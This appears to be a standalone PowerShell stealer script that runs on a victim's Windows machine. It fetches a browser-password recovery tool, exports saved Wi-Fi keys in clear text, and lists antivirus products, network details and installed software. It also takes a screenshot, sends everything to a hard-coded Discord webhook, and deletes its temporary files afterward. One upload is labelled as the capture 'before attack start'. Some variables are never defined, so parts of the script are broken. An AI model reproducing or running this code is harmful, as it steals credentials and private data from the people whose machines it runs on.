#CHANGE URL TO YOUR URL
  $url="https://discord.com/api/webhooks/1107723868031963207/ifWyD34ZC1KbhBayT1XJ1uRlaaUw9KSEajCn00u9wwVGj_yw-RlC031Hqy5VPFF9f0hp" ;

$desktop = ([Environment]::GetFolderPath("Desktop"))
function Get-Nirsoft {

  mkdir \temp 
  cd \temp
  Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
  Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
  Expand-Archive 7z.zip 
  .\7z\7za.exe e wbpv.zip

}

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)



$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
}

function Wifi {
New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
Set-Location -Path "$env:temp"
Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
}

 function Del-Nirsoft-File {
  cd C:\
  rmdir -R \temp
}

function version-av {
  mkdir \temp 
  cd \temp
  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
  Upload-Discord -file "C:\Temp\resultat.txt" -text "Anti-spyware version:"
  cd C:\
  rmdir -R \temp
}

# Get public IP
  $pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content
  echo "PUBLIC IP: $pubip" >> "$env:temp\stats-$namepc.txt";
# Get Local IP
  ipconfig /all >> "$env:temp\stats-$namepc.txt";
# List all installed Software
  echo "Installed Software:" >> "$env:temp\stats-$namepc.txt";
  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
  Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";

  # Screenshot
  cd "$env:temp";
  echo 'function Get-ScreenCapture' > "d.ps1";
  echo '{' >> "d.ps1";
  echo '    begin {' >> "d.ps1";
  echo '        Add-Type -AssemblyName System.Drawing, System.Windows.Forms' >> "d.ps1";
  echo '        Add-Type -AssemblyName System.Drawing' >> "d.ps1";
  echo '        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |' >> "d.ps1";
  echo '            Where-Object { $_.FormatDescription -eq "JPEG" }' >> "d.ps1";
  echo '    }' >> "d.ps1";
  echo '    process {' >> "d.ps1";
  echo '        Start-Sleep -Milliseconds 44' >> "d.ps1";
  echo '            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")' >> "d.ps1";
  echo '        Start-Sleep -Milliseconds 550' >> "d.ps1";
  echo '        $bitmap = [Windows.Forms.Clipboard]::GetImage()' >> "d.ps1";
  echo '        $ep = New-Object Drawing.Imaging.EncoderParameters' >> "d.ps1";
  echo '        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)' >> "d.ps1";
  echo '        $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture"' >> "d.ps1";
  echo '        $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep)' >> "d.ps1";
  echo '    }' >> "d.ps1";
  echo '}' >> "d.ps1";
  echo 'Get-ScreenCapture' >> "d.ps1";
  $screencapture = echo $env:temp"\"$env:UserName"_Capture"
  powershell -c $env:temp\d.ps1;
  $Screencap = "$env:temp\d.ps1";

# Upload Stat
  curl.exe -F "file1=@stats-$namepc.txt" $url;
# Upload wifi password
  curl.exe -F "file2=@WIFI-$namepc.txt" $url;

  # Upload screenshot
  sleep 1
  $Body=@{ content = "**Screen Capture before attack start**"};
  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
  curl.exe -F "file2=@$screencapture.jpg" $url;